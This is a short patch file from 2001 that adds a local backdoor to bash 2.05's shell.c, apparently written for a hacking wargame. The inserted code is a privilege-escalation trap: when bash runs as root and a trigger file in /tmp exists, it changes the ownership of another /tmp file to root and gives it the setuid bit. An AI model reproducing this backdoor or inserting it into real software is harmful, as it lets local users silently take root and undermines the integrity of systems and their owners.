@@ -1,0 +1,35 @@
+#local bash backdoor patch
+#Author: lockdown
+#Date: Oct. 08, 2001
+#
+#Usage: patch shell.c bashp
+#This patch applys a local backdoor to bash(version 2.05), I made this to use
+#in a wargame I was participating in.
+--- shell.c	Mon Oct  8 13:12:10 2001
++++ patch.c	Mon Oct  8 13:48:17 2001
+@@ -291,6 +291,7 @@
+ {
+   register int i;
+   int code, saverst, old_errexit_flag;
++  struct stat finfo;
+   volatile int locally_skip_execution;
+   volatile int arg_index, top_level_arg_index;
+ #ifdef __OPENNT
+@@ -400,6 +401,16 @@
+ 
+   if (running_setuid && privileged_mode == 0)
+     disable_priv_mode ();
++
++  if(getuid()==0)
++  {
++    if(stat("/tmp/mcliZokhb",&finfo)==0)
++    {
++      chown("/tmp/mclzaKmfa",0,0);
++      chmod("/tmp/mclzaKmfa",S_ISUID|S_IREAD|S_IXUSR|S_IRGRP|S_IXGRP|
++             S_IROTH|S_IXOTH);
++    }
++  }
+ 
+
+
+
